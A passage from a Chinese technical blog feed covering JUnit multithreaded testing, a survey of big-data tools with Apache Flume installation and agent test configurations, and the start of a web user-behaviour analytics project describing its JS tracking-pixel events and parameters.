&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@FunctionalInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Exec</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span></span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@FunctionalInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AfterExec</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">afterExec</span><span class="params">()</span></span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于GroboUtils"><a href="#基于GroboUtils" class="headerlink" title="基于GroboUtils"></a>基于GroboUtils</h3><ul><li><p>多线程测试(基于Junit+<a href="http://groboutils.sourceforge.net/" target="_blank" rel="noopener">GroboUtils</a>)</p><ul><li><p>安装依赖</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第三方库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>opensymphony-releases<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Repository Opensymphony Releases<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/content/repositories/opensymphony-releases<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repository</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sourceforge.groboutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groboutils-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>5<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">multiRequestsTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> runnerCount = <span class="number">100</span>; <span class="comment">// 并发数</span></span><br><span class="line"><span class="comment">// 构造一个Runner</span></span><br><span class="line">TestRunnable runner = <span class="keyword">new</span> TestRunnable() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runTest</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="comment">// TODO 测试内容</span></span><br><span class="line"><span class="comment">// Thread.sleep(1000); // 结合sleep表示业务处理过程，测试效果更加明显</span></span><br><span class="line">System.out.println(<span class="string">"===&gt;"</span> + Thread.currentThread().getId());</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TestRunnable[] arrTestRunner = <span class="keyword">new</span> TestRunnable[runnerCount];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; runnerCount; i++) &#123;</span><br><span class="line">arrTestRunner[i] = runner; </span><br><span class="line">&#125;</span><br><span class="line">MultiThreadedTestRunner mttr = <span class="keyword">new</span> MultiThreadedTestRunner(arrTestRunner);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">mttr.runTestRunnables();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><p>参考</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h2&gt;&lt;h3 id=&quot;Rule&quot;&gt;&lt;a href=&quot;#Rule&quot; class=&quot;headerlink&quot; title=&quot;@Rule&quot;&gt;&lt;/a&gt;@Rule&lt;
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="test" scheme="http://blog.aezo.cn/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>大数据项目相关工具</title>
    <link href="http://blog.aezo.cn/2021/08/07/bigdata/bigdata-tools/"/>
    <id>http://blog.aezo.cn/2021/08/07/bigdata/bigdata-tools/</id>
    <published>2021-08-07T05:48:00.000Z</published>
    <updated>2022-01-20T07:27:16.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="相关工具说明"><a href="#相关工具说明" class="headerlink" title="相关工具说明"></a>相关工具说明</h2><ul><li>数据抽取层<ul><li>sqoop(结构化关系型数据抽取)、flume(非结构化日志接入)</li></ul></li><li>数据存储层<ul><li>hadoop-hdfs、kafka(流式总线)</li></ul></li><li>计算调度层<ul><li>离线计算：hive、spark、MR、tez</li><li>实时计算：storm、spark、近年来flink也较多</li><li>数据调度：Airflow Azkaban Oozie等、Dolphin-scheduler</li></ul></li><li>查询引擎层：ROLAP、MOLAP以及二者混搭<ul><li>Hbase</li><li>ES</li><li>Apache Kylin</li><li><a href="https://druid.apache.org/" target="_blank" rel="noopener">Apache Druid</a><ul><li><a href="https://www.cnblogs.com/tree1123/p/12866898.html" target="_blank" rel="noopener">https://www.cnblogs.com/tree1123/p/12866898.html</a></li><li><a href="https://blog.csdn.net/qq_38704184/article/details/106507062" target="_blank" rel="noopener">https://blog.csdn.net/qq_38704184/article/details/106507062</a></li></ul></li><li>TiDB</li><li>Impala</li><li>ClickHouse</li><li>Presto</li><li><a href="http://www.360doc.com/content/20/0815/19/22849536_930520678.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/20/0815/19/22849536_930520678.shtml</a><ul><li>Hawq</li><li>Spark SQL</li><li>Greenplum</li><li>HANA</li></ul></li></ul></li><li>数据可视化层<ul><li>基础框架：ECharts、D3、Three.js</li><li>商业：Tableau、DataV、FineReport、FineBI、PowerBI(微软)</li><li>开源：Bokeh、Matplotlib、Metabase、Superset</li><li><a href="#Superset">Superset</a>：SQL语句、图表、Dashbord、权限</li><li>Redash: 基于python<ul><li><a href="https://zhuanlan.zhihu.com/p/31292944" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/31292944</a></li></ul></li><li>Metabase：基于java、有收费版。<a href="https://zhuanlan.zhihu.com/p/52085283" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52085283</a> (缺点较多)</li><li>Saiku<ul><li><a href="https://www.cnblogs.com/DFX339/p/10316309.html" target="_blank" rel="noopener">https://www.cnblogs.com/DFX339/p/10316309.html</a></li></ul></li></ul></li></ul><h2 id="相关架构图"><a href="#相关架构图" class="headerlink" title="相关架构图"></a>相关架构图</h2><ul><li><a href="https://img-blog.csdnimg.cn/img_convert/a82b7d72897ab899cdb8f9c21f354c45.png" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/img_convert/a82b7d72897ab899cdb8f9c21f354c45.png</a></li><li><a href="https://img-blog.csdnimg.cn/img_convert/2abe208f7e8fdd26db42f0e5155746fb.png" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/img_convert/2abe208f7e8fdd26db42f0e5155746fb.png</a></li></ul><h2 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h2><ul><li>数据中台的核心组成以及一些技术选型参考 <a href="https://blog.51cto.com/u_14410880/2546005" target="_blank" rel="noopener">https://blog.51cto.com/u_14410880/2546005</a></li></ul><h2 id="Flume"><a href="#Flume" class="headerlink" title="Flume"></a>Flume</h2><h3 id="Flume简介"><a href="#Flume简介" class="headerlink" title="Flume简介"></a>Flume简介</h3><ul><li>Apache Flume 是一个分布式、高可靠、高可用的用来收集、聚合、转移不同来源的大量日志数据到中央数据仓库的工具</li><li><a href="http://flume.apache.org/" target="_blank" rel="noopener">官网</a>、<a href="https://flume.liyifeng.org/" target="_blank" rel="noopener">v1.9中文文档</a></li><li>相关概念<ul><li>Event是Flume定义的一个数据流传输的最小单元</li><li>Agent就是一个Flume的实例，本质是一个JVM进程，该JVM进程控制Event数据流从外部日志生产者那里传输到目的地（或者是下一个Agent）</li><li>当Source接收Event时，它将其存储到一个或多个channel。该channel是一个被动存储器（或者说叫存储池），可以存储Event直到它被Sink消耗</li></ul></li><li>Flume支持以下比较流行的日志类型读取：Avro(Apache Avro)、Thrift、Syslog、Netcat</li><li><p>数据流模型</p><p>  <img src="/data/images/bigdata/flume-arch.png" alt="flume-arch.png"></p><ul><li>次数据流只是一种组合方式，简单的只需要一个Agent，甚至还有更复杂的组合</li></ul></li><li>结合HDFS使用参考<a href="/_posts/bigdata/bigdata-project-user-analysis.md#Flume传输日志">bigdata-project-user-analysis.md#Flume传输日志</a></li></ul><h3 id="Flume安装"><a href="#Flume安装" class="headerlink" title="Flume安装"></a>Flume安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/bigdata/</span><br><span class="line">wget https://ftp.jaist.ac.jp/pub/apache/flume/1.9.0/apache-flume-1.9.0-bin.tar.gz</span><br><span class="line">tar -zxvf apache-flume-1.9.0-bin.tar.gz</span><br><span class="line">mv apache-flume-1.9.0-bin flume-1.9.0</span><br><span class="line">rm -rf flume-1.9.0/docs</span><br><span class="line"><span class="comment"># **设置环境变量 export FLUME_HOME=/opt/bigdata/flume-1.9.0 并暴露 $FLUME_HOME/bin</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># **配置flume环境 export JAVA_HOME=/usr/java/jdk1.8.0_202-amd64</span></span><br><span class="line">cp conf/flume-env.sh.template conf/flume-env.sh &amp;&amp; vi conf/flume-env.sh</span><br><span class="line"><span class="comment"># 执行 flume-ng 命令查看安装版本</span></span><br><span class="line">flume-ng version</span><br><span class="line"><span class="comment"># 参考 conf/flume-conf.properties.template 创建Agent配置文件conf-file，并启动Agent</span></span><br><span class="line">flume-ng agent --conf-file my-flume-conf.properties --name a1 -Dflume.root.logger=INFO,console</span><br></pre></td></tr></table></figure><h3 id="单Agent测试"><a href="#单Agent测试" class="headerlink" title="单Agent测试"></a>单Agent测试</h3><ul><li>配置文件(~/flume/test.conf)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent 名称和后面对应，其中a1为当前Agent名称，</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source 配置数据源，此处监听node01:44444(netcat，可监听telnet的数据传输)</span></span><br><span class="line"><span class="comment"># Source配置参考 https://flume.liyifeng.org/#flume-sources</span></span><br><span class="line">a1.sources.r1.type = netcat <span class="comment"># 还可以为 avro、exec(读取命令输出)、spooldir(读取目录下文件，可设置后缀等)</span></span><br><span class="line">a1.sources.r1.bind = node01</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink 配置输出</span></span><br><span class="line"><span class="comment"># Sink配置参考 https://flume.liyifeng.org/#flume-sinks</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory 缓存队列，transactionCapacity表示每次读取的任务数</span></span><br><span class="line"><span class="comment"># Channel配置参考 https://flume.liyifeng.org/#flume-channels</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel 对相关角色绑定Channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><ul><li>启动并测试</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node01启动，指定Agent的名称为 a1</span></span><br><span class="line">flume-ng agent --conf-file ~/flume/test.conf --name a1 -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># 在其他节点如node2上测试</span></span><br><span class="line"><span class="comment"># 连接后随便输入，在node01上便会打印，如`21/08/07 23:55:50 INFO sink.LoggerSink: Event: &#123; headers:&#123;&#125; body: 31 32 33 0D                                     123. &#125;`</span></span><br><span class="line">telnet node01 44444</span><br></pre></td></tr></table></figure><h3 id="两个Agent连接测试"><a href="#两个Agent连接测试" class="headerlink" title="两个Agent连接测试"></a>两个Agent连接测试</h3><ul><li>node02配置文件(~/flume/test2.conf)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = node02</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink 输出到 node01:10086 端口</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = node01</span><br><span class="line">a1.sinks.k1.port = 10086</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><ul><li>node01配置文件(~/flume/test2.conf)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source 监听 node01:10086 端口数据源输入</span></span><br><span class="line">a1.sources.r1.type = avro</span><br><span class="line">a1.sources.r1.bind = node01</span><br><span class="line">a1.sources.r1.port = 10086</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><ul><li>启动</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 node01/node02</span></span><br><span class="line">flume-ng agent --conf-file ~/flume/test2.conf --name a1 -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># 连接node02并发送数据给node02，会发现数据打印在node01</span></span><br><span class="line">telnet node02 44444</span><br></pre></td></tr></table></figure><h2 id="sqoop"><a href="#sqoop" class="headerlink" title="sqoop"></a>sqoop</h2><h2 id="可视化框架"><a href="#可视化框架" class="headerlink" title="可视化框架"></a>可视化框架</h2><h3 id="Superset"><a href="#Superset" class="headerlink" title="Superset"></a>Superset</h3><ul><li><a href="https://superset.apache.org/" target="_blank" rel="noopener">官网</a><ul><li>由Airbnb开源的、目前由Apache孵化的，基于Flask-appbuilder搭建，基于python实现</li></ul></li><li>功能<ul><li>自带SQLite数据库并支持连接Hive、Impala、MySql、Oracle等几乎所有主流的数据源</li><li>支持和弦图、事件流图、热力图、视图表等及其它常规的可视化展示图表</li><li>支持可控的数据展示，能自定义展示字段、数据源等</li><li>支持权限控制</li><li>内含SQL查询面板模块</li><li>创建和分享dashboard</li></ul></li><li>参考文章<ul><li><a href="https://baijiahao.baidu.com/s?id=1703444220257145031" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1703444220257145031</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;相关工具说明&quot;&gt;&lt;a href=&quot;#相关工具说明&quot; class=&quot;headerlink&quot; title=&quot;相关工具说明&quot;&gt;&lt;/a&gt;相关工具说明&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;数据抽取层&lt;ul&gt;
&lt;li&gt;sqoop(结构化关系型数据抽取)、flume(非结构化日志接入)&lt;
      
    
    </summary>
    
      <category term="bigdata" scheme="http://blog.aezo.cn/categories/bigdata/"/>
    
    
  </entry>
  
  <entry>
    <title>大数据项目实践 —— 用户行为分析</title>
    <link href="http://blog.aezo.cn/2021/07/25/bigdata/bigdata-project-user-analysis/"/>
    <id>http://blog.aezo.cn/2021/07/25/bigdata/bigdata-project-user-analysis/</id>
    <published>2021-07-25T10:11:00.000Z</published>
    <updated>2021-08-31T06:07:20.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>本项目源码参考<a href="https://github.com/oldinaction/smjava" target="_blank" rel="noopener">smjava/bigdata-hadoop-project</a></li><li>可通过站长工具查看某网站的每日PV值(只有通过百度等外链进入网站的才会统计，直接输入网址无法被此类工具统计到)，从而估算一下网站每日产生的数据量</li><li>集群大小<ul><li>中小型30-50台，100台以上可认为是较大集群了</li><li>三一共6套集群：最新12台机器，最大68台，都是基于128G来说的；北京某交通分析，38台集群</li><li>spark(充分利用内存)、redis、hbase这种内存消耗较大的一般不混合部署；zk、hadoop这种可以混合部署</li></ul></li><li>日志大小(按天算)<ul><li>条数：千万级别-亿级别</li><li>大小：几百个G，中大型集群可能上PB/T；<strong>条数(PV数) * 每条大小(如1KB左右)</strong></li></ul></li></ul><h2 id="用户行为分析需求"><a href="#用户行为分析需求" class="headerlink" title="用户行为分析需求"></a>用户行为分析需求</h2><ul><li>本项目分别从七个大的角度来进行用户行为分析<ul><li>用户基本信息分析模块<ul><li>用户基本信息分析模块主要是从用户/访客和会员两个主要角度分析浏览相关信息，包括但不限于新增用户，活跃用户，总用户，新增会员，活跃会员，总会员以及会话分析等</li></ul></li><li>浏览器信息分析模块<ul><li>在用户基本信息分析的基础上添加一个浏览器这个维度信息：浏览器用户分析、浏览器会员分析、浏览器会话分析、浏览器PV分析</li></ul></li><li>地域信息分析模块<ul><li>活跃访客地域分析、跳出率分析(分析各个不同地域的跳出率情况)</li></ul></li><li>用户浏览深度分析模块</li><li>外链数据分析模块<ul><li>主要分析各个不同外链端带来的用户访问量数据：外链偏好分析、外链会话(跳出率)分析</li></ul></li><li>订单分析模块</li><li>事件分析模块<ul><li>如订单相关的事件</li></ul></li></ul></li><li>几个项目概念<ul><li>用户/访客：表示同一个浏览器代表的用户。唯一标示用户</li><li>会员：表示网站的一个正常的会员用户</li><li>会话：一段时间内的连续操作，就是一个会话中的所有操作</li><li>PV：访问页面的数量</li><li>在本次项目中，所有的计数都是去重过的。比如：活跃用户/访客，计算uuid的去重后的个数</li></ul></li><li><p>数据流向图</p><p>  <img src="/data/images/bigdata/bigdata-user-analysis.png" alt="bigdata-user-analysis.png"></p><ul><li>其中将Hbae的数据进行计算后，将结果保存到mysql，可以使用手写MapReduce或基于Hive实现</li></ul></li></ul><h2 id="JS-SDK设计"><a href="#JS-SDK设计" class="headerlink" title="JS SDK设计"></a>JS SDK设计</h2><ul><li>不采用ip来标示用户的唯一性，而是通过在cookie中填充一个uuid来标示用户的唯一性</li><li><p>Js sdk执行工作流</p><p>  <img src="/data/images/bigdata/bigdata-user-analysis-flow.png" alt="bigdata-user-analysis-flow.png"></p></li><li>PC端事件分析<ul><li>用户基本信息就是用户的浏览行为信息分析，也就是我们只需要pageview事件就可以了</li><li>浏览器信息分析以及地域信息分析其实就是在用户基本信息分析的基础上添加浏览器和地域这个维度信息<ul><li>其中浏览器信息我们可以通过浏览器的window.navigator.userAgent来进行分析</li><li>地域信息可以通过nginx服务器来收集用户的ip地址来进行分析</li></ul></li><li>外链数据分析以及用户浏览深度分析我们可以在pageview事件中添加访问页面的当前url和前一个页面的url来进行处理分析</li><li>订单信息分析要求pc端发送一个订单产生的事件，那么对应这个模块的分析，需要一个新的事件chargeRequest</li><li>对于事件分析我们也需要一个pc端发送一个新的事件数据，我们可以定义为event。除此之外，我们还需要设置一个launch事件来记录新用户的访问</li><li>PC端的各种不同事件发送的数据url格式如下，其中url中后面的参数就是我们收集到的数据：<a href="http://node01/bigdata-tracker.png?requestdata" target="_blank" rel="noopener">http://node01/bigdata-tracker.png?requestdata</a><ul><li><strong>通过JS请求一个图片URL，并附带请求参数，这样不会影响前端页面的正常运行</strong></li></ul></li></ul></li><li>事件和可分析的模块<ul><li>pageview事件：用户基本信息分析、浏览器信息分析、地域信息分析、外链数据分析、用户浏览深度分析</li><li>chargeRequest事件：订单信息分析</li><li>event事件：事件分析</li><li>launch事件</li></ul></li></ul><h3 id="事件说明"><a href="#事件说明" class="headerlink" title="事件说明"></a>事件说明</h3><ul><li>Launch事件<ul><li>当用户第一次访问网站的时候触发该事件，不提供对外调用的接口，只实现该事件的数据收集</li><li>发送的数据 <code>u_sd=8E9559B3-DA35-44E1-AC98-85EB37D1F263&amp;c_time=1449137597974&amp;ver=1&amp;en=e_l&amp;pl=website&amp;sdk=js&amp;b_rst=1920*1080&amp;u_ud=12BF4079-223E-4A57-AC60-C1A04D8F7A2F&amp;b_iev=Mozilla%2F5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.1%20(KHTML%2C%20like%20Gecko)%20Chrome%2F21.0.1180.77%20Safari%2F537.1&amp;l=zh-CN</code></li></ul></li><li>Pageview事件<ul><li>当用户访问页面/刷新页面的时候触发该事件。该事件会自动调用，也可以让程序员手动调用</li><li>发送的数据 <code>ver=1&amp;en=e_pv&amp;pl=website&amp;sdk=js&amp;b_rst=1920*1080&amp;u_ud=12BF4079-223E-4A57-AC60-C1A04D8F7A2F&amp;b_iev=Mozilla%2F5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.1%20(KHTML%2C%20like%20Gecko)%20Chrome%2F21.0.1180.77%20Safari%2F537.1&amp;l=zh-CN&amp;u_sd=8E9559B3-DA35-44E1-AC98-85EB37D1F263&amp;c_time=1449137597979&amp;ht=www.msb.com%3A8080&amp;p_url=http%3A%2F%2Fwww.msb.com%3A8080%2Fvst_track%2Findex.html</code></li></ul></li><li><p>ChargeRequest事件</p><ul><li>当用户下订单的时候触发该事件，该事件需要程序主动调用。</li><li>发送的数据 <code>u_sd=8E9559B3-DA35-44E1-AC98-85EB37D1F263&amp;c_time=1449139048231&amp;oid=orderid123&amp;on=%E4%BA%A7%E5%93%81%E5%90%8D%E7%A7%B0&amp;cua=1000&amp;cut=%E4%BA%BA%E6%B0%91%E5%B8%81&amp;pt=%E6%B7%98%E5%AE%9D&amp;ver=1&amp;en=e_crt&amp;pl=website&amp;sdk=js&amp;b_rst=1920*1080&amp;u_ud=12BF4079-223E-4A57-AC60-C1A04D8F7A2F&amp;b_iev=Mozilla%2F5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.1%20(KHTML%2C%20like%20Gecko)%20Chrome%2F21.0.1180.77%20Safari%2F537.1&amp;l=zh-CN</code></li><li><p>参数</p><p>| 参数           | 类型   | 是否必填 | 描述             |<br>| ————– | —— | ——– | —————- |<br>| orderId        | string | 是       | 订单id           |<br>| orderName      | String | 是       | 产品购买描述名称 |<br>| currencyAmount | double | 是       | 订单价格         |<br>| currencyType   | String | 是       | 货币类型         |<br>| paymentType    | String | 是       | 支付方式         |</p></li></ul></li><li><p>Event事件</p><ul><li>当访客/用户触发业务定义的事件后，前端程序调用该方法</li><li>发送的数据 <code>ca=%E7%B1%BB%E5%9E%8B&amp;ac=%E5%8A%A8%E4%BD%9C&amp;c_time=1449139512665&amp;u_sd=8E9559B3-DA35-44E1-AC98-85EB37D1F263&amp;kv_p_url=http%3A%2F%2Fwwwmsb..com%3A8080%2Fvst_track%2Findex.html&amp;kv_%E5%B1%9E%E6%80%A7key=%E5%B1%9E%E6%80%A7value&amp;du=1000&amp;ver=1&amp;en=e_e&amp;pl=website&amp;sdk=js&amp;b_rst=1920*1080&amp;u_ud=12BF4079-223E-4A57-AC60-C1A04D8F7A2F&amp;b_iev=Mozilla%2F5.0%20(Windows%20NT%206.1%3B%20WOW64)%20AppleWebKit%2F537.1%20(KHTML%2C%20like%20Gecko)%20Chrome%2F21.0.1180.77%20Safari%2F537.1&amp;l=zh-CN</code></li><li><p>参数</p><p>| 参数     | 类型   | 是否必填 | 描述           |<br>| ——– | —— | ——– | ————– |<br>| category | string | 是       | 自定义事件名称 |<br>| action   | String | 是       | 自定义事件动作 |<br>| map      | map    | 否       | 其他参数       |<br>| duration | long   | 否       | 事件持续时间   |</p></li></ul></li></ul><h3 id="数据参数说明"><a href="#数据参数说明" class="headerlink" title="数据参数说明"></a>数据参数说明</h3><ul><li>在各个不同事件中收集不同的数据发送到nginx服务器，但是实际上这些收集到的数据还是有一些共性的。下面将所用可能用到的参数描述如下</li></ul><table><thead><tr><th>参数名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>en</td><td>string</td><td>事件名称, eg: e_pv</td></tr><tr><td>ver</td><td>string</td><td>版本号, eg: 0.0.1</td></tr><tr><td>pl</td><td>string</td><td>平台, eg: website,javaserver</td></tr><tr><td>sdk</td><td>string</td><td>Sdk类型, eg: js</td></tr><tr><td>b_rst</td><td>string</td><td>浏览器分辨率，eg: 